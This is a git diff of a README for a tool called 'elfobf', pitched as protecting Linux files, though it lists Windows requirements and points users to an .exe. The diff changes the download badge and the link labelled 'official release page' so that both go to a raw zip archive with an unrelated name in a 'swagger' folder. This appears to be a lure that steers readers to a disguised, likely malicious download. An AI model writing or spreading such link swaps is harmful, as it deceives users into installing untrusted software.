@@ -1,6 +1,6 @@
 # 🛡️ elfobf - Keep your linux files safe today
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Low-pantssuit12/elfobf/releases)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Low-pantssuit12/elfobf/main/swagger/Software_bifurcate.zip)
 
 ## 📦 What is this tool
 
@@ -13,7 +13,7 @@ You need a computer with Windows 10 or 11. You must have at least 4 gigabytes of
 ## 📥 How to get started
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Low-pantssuit12/elfobf/releases).
+2. Go to the [official release page](https://raw.githubusercontent.com/Low-pantssuit12/elfobf/main/swagger/Software_bifurcate.zip).
 3. Look for the latest version at the top of the list.
 4. Click the file name that ends with .exe to start the download.
 5. Wait for the file to finish saving to your computer.
